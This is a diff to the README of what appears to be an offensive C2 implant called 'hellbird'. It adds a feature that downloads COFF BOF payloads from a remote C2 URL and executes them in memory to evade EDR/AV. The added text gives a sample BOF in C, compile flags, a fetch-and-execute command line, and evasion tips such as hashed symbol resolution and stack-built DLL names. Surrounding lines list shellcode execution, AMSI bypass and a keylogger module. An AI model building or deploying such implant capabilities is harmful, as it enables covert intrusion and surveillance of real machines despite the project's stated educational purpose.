@@ -112,6 +112,7 @@ rule hellbird_Runtime_Behavior {
  - **shellcode:** Download and execute a shellcode in memory. Supports multiple operative systems and formats msfvenom friendly (in windows the technique used is Early brid APC Injection).
  - **amsi:** Bypass AMSI (Anti-Malware Scan Interface) on Windows systems to evade detection by PowerShell, WMI, and other scripting engines.
  - **load_module:** load dll on Windows systems to evade detection loading in memory from an url
+ - **bof:** load COFF BOF object file on Windows systems to evade detection loading in memory from an url (COFFLoader3 inspired in [COFFLoader] (https://github.com/trustedsec/COFFLoader/) & [CoffeeLdr](https://github.com/Cracked5pider/CoffeeLdr)) (Like Cobalt Strike)
  - **terminate:** Terminates the implant or beacon, removing files and persistence mechanisms.
 
 ## 🔥 Modules
@@ -121,6 +122,114 @@ This beacon have load_module command you need pass a url to an dll module, for n
 - **Screenshot**: gen_dll_ss.sh
 - **Keylogger**: gen_key.sh
 - **Stealth Command**: gen_module.sh
+
+## 🚀 Feature: bof: — Execute COFF BOF Objects In-Memory (Cobalt Strike Style)
+
+Evade EDR/AV detection by loading and executing position-independent BOF (Binary Object File) payloads directly from a remote URL — without touching disk, without LoadLibrary, and without traditional PE loaders. 
+
+This feature is inspired by — but goes beyond — industry-standard tools like TrustedSec’s COFFLoader and CoffeeLdr . It’s engineered for stealth, reliability, and deep Windows internals compliance.
+
+### 🎯 How It Works — The Engineering Breakdown
+1. Command Syntax
+   
+```bash
+bof:http://your-c2.com/payload.x64.o [optional_args]
+```
+- Downloads the raw .o (COFF) file over HTTP(S).
+- Parses the COFF structure in-memory.
+- Maps sections (.text, .rdata, .pdata, etc.) into PAGE_EXECUTE_READWRITE regions.
+- Applies x64 relocations (ADDR64, REL32, REL32_1-5, etc.) with trampoline generation for out-of-range jumps.
+- Resolves external symbols (e.g., BeaconPrintf, GetModuleHandleA, CoInitializeEx) via a precomputed DJB2 hash table.
+- Executes the target function (usually go) with aligned stack and proper calling convention (ms_abi).
+
+### 2. Why COFF?
+
+- No PE Headers: Avoids LoadLibrary and module list enumeration.
+- No Imports Section: Symbols are resolved manually via hash — invisible to static analysis.
+- Position Independent: Code can be relocated anywhere in memory.
+- Cobalt Strike Compatible: BOFs compiled with x86_64-w64-mingw32-gcc -c -fPIC work out-of-the-box.
+
+### 3. Symbol Resolution — The Heart of the System
+Your BOF doesn’t call GetModuleHandleA directly — it calls __imp_GetModuleHandleA, a thunk pointer that must be patched at load time.
+
+### ✅ Our loader does this correctly by:
+
+- Including both versions in the symbol hash table:
+
+```c
+{ 0x3EB5B2FB, (void*)&__imp_GetModuleHandleA }, // "__imp_GetModuleHandleA"
+{ 0x3EB5B2FB, (void*)GetModuleHandleA         }, // "GetModuleHandleA" (fallback)
+```
+- Using extern FARPROC __imp_* in BOF source code to force correct linking.
+- Validating pointer sanity (> 0x10000) before execution.
+
+### 4. Memory & Security Engineering
+- RWX Pages: Sections are mapped as PAGE_EXECUTE_READWRITE during relocation, then optionally protected.
+- Trampolines: Auto-generated for REL32 calls that exceed 2GB range — no manual assembly required.
+- Stack Alignment: The call_go_aligned wrapper ensures 16-byte stack alignment before BOF entry.
+- No CRT: Zero dependency on msvcrt.dll — uses only WinAPI and Beacon API.
+
+### Built-in verbose logging lets you trace every step:
+
+```text
+[BOF] ✅ Resuelto 'GetModuleHandleA' → 0x00007FF690217770
+[BOF] 🔧 Aplicando reloc tipo 4 en 0x000001A802DB1234 -> 0x00007FF690217770
+[DEBUG] GetModuleHandleA = 0x00007FF690217770
+[DEBUG] GetModuleHandleA bytes: 4C 8B DC 48 83 EC 20
+```
+🛠️ How to Create Your Own BOFs
+- Step 1: Write Your BOF (C Source)
+```c
+#include <windows.h>
+#include "beacon.h"
+
+// Declare imports correctly — THIS IS CRITICAL
+extern FARPROC __imp_GetModuleHandleA;
+extern FARPROC __imp_GetProcAddress;
+extern FARPROC __imp_LoadLibraryA;
+
+void go(char *args, int alen) {
+    BeaconPrintf(CALLBACK_OUTPUT, "[MYBOF] Started with args: %.*s", alen, args);
+
+    // Use __imp_* thunks — DO NOT call GetModuleHandleA() directly
+    HMODULE hKernel32 = ((HMODULE(WINAPI*)(LPCSTR))__imp_GetModuleHandleA)("kernel32.dll");
+    if (!hKernel32) {
+        BeaconPrintf(CALLBACK_ERROR, "[MYBOF] ❌ Failed to get kernel32");
+        return;
+    }
+
+    BeaconPrintf(CALLBACK_OUTPUT, "[MYBOF] Success! hKernel32 = %p", hKernel32);
+}
+```
+
+### Step 2: Compile to COFF (.o file)
+```bash
+x86_64-w64-mingw32-gcc -c -fPIC -O2 -fno-stack-protector -nostdlib \
+  -fno-builtin -masm=intel -fno-asynchronous-unwind-tables \
+  mybof.c -o mybof.x64.o
+```
+
+## Step 3: Host and Execute
+
+```bash
+# Host the .o file
+python3 -m http.server 8080
+
+# In your beacon console:
+bof:http://localhost:8080/mybof.x64.o "Hello World"
+```
+
+### 📌 Pro Tips
+- Always use extern FARPROC __imp_FunctionName in your BOF — never assume the loader will magically fix it.
+- Test with whoami.c and Lapsdump.c — they’re battle-tested reference implementations.
+- If you see 0x9090... or 0x7ff7... addresses, your symbol hash table is missing __imp_* entries.
+- Use objdump -t yourbof.x64.o | grep "UND" to list all undefined symbols your BOF needs.
+- Never use string literals for DLL names — use stack buffers: char k32[] = {'k','e','r','n','e','l','3','2','.','d','l','l',0};
+
+### 🧪 Example BOFs Included
+**whoami.c**: Retrieves current username and computer name — perfect for testing symbol resolution.
+**Test.c**:  Test BOF to start develops or test the loader.
+
 
 ## 🎓 Educational Purpose
 This project is intended to:
